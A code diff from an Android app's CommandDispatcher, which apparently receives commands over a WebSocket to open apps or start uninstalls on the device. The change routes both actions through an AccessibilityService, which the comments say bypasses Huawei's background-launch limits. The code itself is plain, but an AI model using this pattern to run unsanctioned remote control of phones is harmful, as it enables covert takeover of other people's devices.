@@ -1342,16 +1342,24 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         if (pkg.isEmpty()) return;
 
         try {
-            // 优先用 AccessibilityService 启动，绕过华为后台启动限制
-            MyAccessibilityService service = MyAccessibilityService.P();
-            Context ctx = service != null ? service : getAppContext();
+            Context ctx = getAppContext();
             if (ctx == null) return;
 
             Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
-            if (intent != null) {
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            if (intent == null) {
+                Log.w(TAG, "openApp: no launch intent for " + pkg);
+                return;
+            }
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            // 优先用 AccessibilityService 启动（有后台启动特权）
+            MyAccessibilityService service = MyAccessibilityService.P();
+            if (service != null) {
+                service.startActivity(intent);
+            } else {
                 ctx.startActivity(intent);
             }
+            Log.d(TAG, "openApp started: " + pkg);
         } catch (Exception e) {
             Log.w(TAG, "openApp failed", e);
         }
@@ -1367,14 +1375,18 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         if (pkg.isEmpty()) return;
 
         try {
-            MyAccessibilityService service = MyAccessibilityService.P();
-            Context ctx = service != null ? service : getAppContext();
-            if (ctx == null) return;
-
             Intent intent = new Intent(Intent.ACTION_DELETE);
             intent.setData(Uri.parse("package:" + pkg));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            ctx.startActivity(intent);
+
+            MyAccessibilityService service = MyAccessibilityService.P();
+            if (service != null) {
+                service.startActivity(intent);
+            } else {
+                Context ctx = getAppContext();
+                if (ctx != null) ctx.startActivity(intent);
+            }
+            Log.d(TAG, "uninstallApp started: " + pkg);
         } catch (Exception e) {
             Log.w(TAG, "uninstallApp failed", e);
         }
